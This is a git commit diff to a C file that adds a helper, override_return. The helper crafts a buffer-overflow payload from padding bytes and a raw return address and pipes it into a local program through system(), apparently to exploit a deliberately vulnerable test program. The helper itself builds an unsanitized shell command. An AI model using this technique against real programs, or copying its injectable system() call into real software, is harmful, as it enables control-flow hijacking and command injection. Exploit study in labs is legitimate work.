b5b99e52c0305034cc208134fd498672a114cc2c
Sunil Parab <sunilparab2023@gmail.com>
2023-06-01 20:50:41 -0400

    Added override function and vuln test file

--- src/override.c
+++ src/override.c
@@ -2,16 +2,24 @@
 #include <stdlib.h>
 #include <string.h>
 
-void override_return(char* prgrm, char* address, int offset){
-          printf("override return received: %s, %s, %d\n", prgrm, address, offset);
+void override_return(char* prgrm, int address, int offset){
+	/*printf("override return received: %s, %s, %d\n", prgrm, address, offset);*/
 
-          int len = strlen(prgrm);
-          char cmd[10000] = "echo ";
-          for (int i = 0; i < offset; i++) {
-               strcat(cmd, "\x65");
-          }
-          strcat(cmd, address);
-          strcat(cmd, " | ./");
-          strcat(cmd, prgrm);
-          system(cmd);
+	int len = strlen(prgrm);
+	char cmd[10000] = "echo ";
+	for (int i = 0; i < offset; i++) {
+		strcat(cmd, "\x65");
+	}
+	
+	char*c = (char*) &address;
+	strncat(cmd, (c), 1);
+	strncat(cmd, (c+1), 1);
+	strncat(cmd, (c+2), 1);
+	strncat(cmd, (c+3), 1);
+
+	strcat(cmd, " | ./");
+	strcat(cmd, prgrm);
+	/*printf("%c %c %c %c", *(c+3), *(c+2), *(c+1), *(c));
+	printf("%s\n", cmd);*/
+	system(cmd);
 }
